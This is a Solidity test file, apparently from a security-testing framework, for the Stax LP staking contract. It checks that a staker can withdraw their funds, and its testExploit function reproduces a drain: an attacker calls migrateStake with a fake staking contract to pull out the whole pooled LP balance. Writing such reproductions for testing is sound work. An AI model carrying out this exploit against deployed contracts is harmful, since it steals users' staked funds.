// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "./FakeStaking.sol";

import "contracts/StaxLP.sol";
import "contracts/StaxLPStaking.sol";
import "@pwnednomore/contracts/PTest.sol";

contract StaxLPStakingTest is PTest {
    StaxLP lp;
    StaxLPStaking lpStaking;

    address owner = address(0x1);
    address user = address(0x2);
    uint256 userLpAmount = 1 ether;

    address agent;

    function setUp() public {
        // Deploy LP token and LP staking contract
        vm.startPrank(owner);
        lp = new StaxLP("Stax Frax/Temple LP Token", "xFraxTempleLP");
        lpStaking = new StaxLPStaking(address(lp), owner);
        vm.stopPrank();

        // Create a user who is going to stake 1 ether LP tokens
        vm.startPrank(user);
        deal(address(lp), user, userLpAmount);
        lp.approve(address(lpStaking), type(uint256).max);
        lpStaking.stakeAll();
        vm.stopPrank();

        agent = getAgent();
    }

    // User should always be able to withdraw the tokens once staked
    function invariantGetWhatPut() public {
        vm.prank(user);
        lpStaking.withdrawAll(false);
        assert(lp.balanceOf(user) >= userLpAmount);
    }

    // Exploit
    function testExploit() public {
        address attacker = address(0x3);
        vm.startPrank(attacker);

        FakeStaking fakeStaking = new FakeStaking();
        uint256 amount = lp.balanceOf(address(lpStaking));
        lpStaking.migrateStake(address(fakeStaking), amount);
        lpStaking.withdrawAll(false);

        emit log_named_uint("attacker LP balance: ", lp.balanceOf(attacker));
        vm.stopPrank();

        invariantGetWhatPut();
    }
}
